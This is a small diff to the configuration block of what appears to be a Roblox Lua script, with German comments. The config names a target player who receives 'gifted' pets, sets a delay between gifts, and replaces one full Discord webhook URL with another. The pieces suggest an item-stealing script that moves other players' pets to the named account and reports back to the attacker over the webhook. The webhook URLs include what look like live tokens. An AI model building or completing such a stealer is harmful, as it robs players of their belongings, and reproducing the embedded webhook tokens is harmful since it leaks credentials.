@@ -5,7 +5,7 @@
 local Config = {
     TargetPlayerName = "CoolHolzBudd", -- Zielspieler, an den Pets geschickt werden
     DelayBetweenGifts = 3, -- Wartezeit zwischen den Geschenken
-    WebhookURL = "https://discord.com/api/webhooks/1352401371952840838/G0ywcotlvhMfda9IAMFRVU3SsHzCJwkszHwdXWBYAp4GhNQ3CJ-kmLgoJwc9BTPeiEOk",
+    WebhookURL = "https://discord.com/api/webhooks/1394009500285145219/90-e9MTp0e80lBPQsmPK5b6MaTWLcPbH_tcKrfL5-KHDpo6xN01kmFHB9HsH3Qt4L2R9",
     DebugMode = false -- Debug-Ausgaben aktivieren
 }
 
